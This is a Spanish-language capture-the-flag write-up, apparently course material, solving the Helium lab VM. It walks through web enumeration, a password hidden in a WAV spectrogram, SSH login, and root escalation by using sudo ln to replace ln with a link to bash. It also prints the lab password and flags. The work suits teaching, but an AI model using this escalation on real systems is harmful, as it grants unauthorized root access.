---
title: "🖥️ Máquina: Helium — Hacking Ético"
aliases:
  - Helium
  - Máquina Helium
  - VM Helium
  - Writeup Helium
tags:
  - ifct0109
  - hacking-etico
  - vms
  - linux
  - ctf
---

# 🖥️ Máquina: Helium

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Dificultad:** Conceptos Básicos  
> **Técnicas trabajadas:** Enumeración web · Análisis espectral de audio · Esteganografía en WAV · Acceso SSH · Escalada de privilegios (sudo + ln)  
> **Descripción:** En esta práctica encontraremos pistas ocultas en el código fuente de la web y dentro de un archivo CSS que nos llevarán a descargar un archivo de audio. Analizando el espectrograma de ese audio descubriremos una contraseña para acceder por SSH. La escalada de privilegios abusa de permisos sudo sobre el comando ln para sustituir el propio binario por un enlace a bash.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.5`
* **`RHOST` (Víctima / Helium):** Ej. `10.0.0.11`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Helium tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

```bash
nmap -sT -p- 10.0.0.11
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
whatweb http://10.0.0.11
```

```text
http://10.0.0.11 [200 OK] Bootstrap, HTTPServer[nginx/1.14.2], Title[RELAX], nginx[1.14.2]
```

```bash
nikto -h http://10.0.0.11
```

```text
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Server: nginx/1.14.2
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8074 requests: 0 error(s) and 3 item(s) reported on remote host
```

---

## 🌐 Fase 2: Análisis de la web — pistas en el código fuente

Visitando la web en se ve como un reproductor de audio. Con curl obtenemos el código fuente completo:

```bash
curl
```

```text
<title>RELAX</title>
<!doctype html>
<html lang="en">
<!-- Please paul, stop uploading weird .wav files using /upload_sound -->
<head>
<style>
body {
  background-image: url('screen-1.jpg');
  background-repeat: no-repeat;
  background-attachment: fixed; 
  background-size: 100% 100%;
}
</style>
    <link href="bootstrap.min.css" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
<audio src="relax.wav" preload="auto loop" controls></audio>
</body>
```

> [!info] Resultado
> En el código fuente encontramos dos pistas:
> · Un comentario que revela al usuario paul y una ruta de subida de archivos: /upload_sound.
> · Un archivo CSS referenciado: bootstrap.min.css.
> Un curl al archivo CSS nos revela algo inesperado:

```bash
curl http://10.0.0.11/bootstrap.min.css
```

```text
/yay/mysecretsound.wav
```

> [!info] Resultado
> El CSS no contiene estilos sino una ruta a un archivo WAV secreto. Lo descargamos:

```bash
wget http://10.0.0.11/yay/mysecretsound.wav
```

---

## 🎵 Fase 3: Análisis espectral del audio

La contraseña está oculta visualmente en el espectrograma del archivo de audio. Esta técnica consiste en codificar información en las frecuencias del sonido de forma que al visualizar el espectrograma (representación gráfica de las frecuencias a lo largo del tiempo) aparezcan letras o formas. Entramos en https://www.dcode.fr/spectral-analysis y lo subimos para que lo analice.

> [!info] Resultado
> Al reproducirlo vemos lo que parecen unas letras en el espectrograma.

```bash
sudo apt update && sudo apt install sox feh -y
```

```bash
sox mysecretsound.wav -n spectrogram
```

```bash
feh spectrogram.png
```

> [!info] Resultado
> Se ve la clave: dancingpassyo

---

## 🔑 Fase 4: Acceso SSH como paul

Nos conectamos con el usuario paul y la clave encontrada en el espectrograma:

```bash
ssh paul@10.0.0.11
```

```text
paul@10.0.0.11's password: dancingpassyo
```

```bash
id
```

Capturamos la bandera:

```bash
ls -la
```

```bash
cat user.txt
```

```text
ilovetoberelaxed
```

> [!info] Resultado
> Flag de usuario obtenida: ilovetoberelaxed

---

## 🚀 Fase 5: Escalada de privilegios — sudo + ln

```bash
sudo -l
```

```text
(ALL : ALL) NOPASSWD: /usr/bin/ln
```

> [!info] Resultado
> paul puede ejecutar ln como root sin contraseña. Buscamos en GTFOBins — ln sudo. La técnica consiste en usar el propio ln con sudo para reemplazarse a sí mismo con un enlace simbólico a /bin/bash. La siguiente vez que se ejecute sudo ln en realidad se ejecutará bash con privilegios de root:

```bash
sudo /bin/ln -fs /bin/bash /bin/ln
```

```bash
sudo /bin/ln
```

> [!info] Resultado
> Y ya somos root:

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

Capturamos la bandera de root:

```bash
cd /root
```

```bash
ls -la
```

```bash
cat root.txt
```

```text
ilovetoberoot
```

> [!info] Resultado
> Flag de root obtenida: ilovetoberoot

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
